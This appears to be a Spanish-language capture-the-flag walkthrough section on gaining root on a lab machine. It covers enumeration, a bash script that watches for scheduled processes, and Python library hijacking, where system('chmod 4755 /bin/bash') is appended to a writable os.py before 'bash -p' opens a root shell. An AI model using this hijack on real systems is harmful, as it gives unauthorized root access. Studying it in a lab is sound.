## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
uname -a
find \-perm -4000 2>/dev/null
```

No vemos nada interesante por aqui. Miramos si existen tareas que se ejecutan a interval regulares de tiempo.


```bash
cd /dev/shm/
nano procmon.sh


#!/bin/bash

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command"
    old_process=$new_process
done
```

Le damos derechos de ejecucion y lo lanzamos. Si esperamos un poco, podemos ver que hay una tarea que se ejecuta lanzando un script
en python.

```bash
ls -l /opt/server_admin/reporter.py
cat /opt/server_admin/reporter.py
```

Vemos que no lo podemos tocar.

#### Library Hijacking {-}

Vemos que el script no hace nada en concreto. Solo importa la libreria os y almacena dos variables y le hace un print.

1. Miramos el orden de busqueda del import de python

    ```bash
    python
    > import sys
    print sys.path
    ```

    Aqui vemos que busca primeramente en el directorio actual de trabajo y despues en `/usr/lib/python2.7/sys.py`

1. Miramos nuestros derechos en la carpeta `/usr/lib/python2.7`

    ```bash
    locate os.py
    ls -l /usr/lib/ | grep "python2.7"
    ```

    Vemos que tenemos todo los derechos en esta carpeta

1. Alteramos el fichero os.py

    ```bash
    cd /usr/lib/python2.7
    nano os.py
    ```

    Al final de este fichero, añadimos el comando siguiente

    ```python
    system("chmod 4755 /bin/bash")
    ```

1. Monitorizamos la /bin/bash

    ```bash
    watch -n 1 ls -l /bin/bash
    ```

Vemos que aparece un `s` en la /bin/bash

```bash
bash -p
whoami
#Output
root
cd /root
cat root.txt
```

Ya podemos leer el root.txt
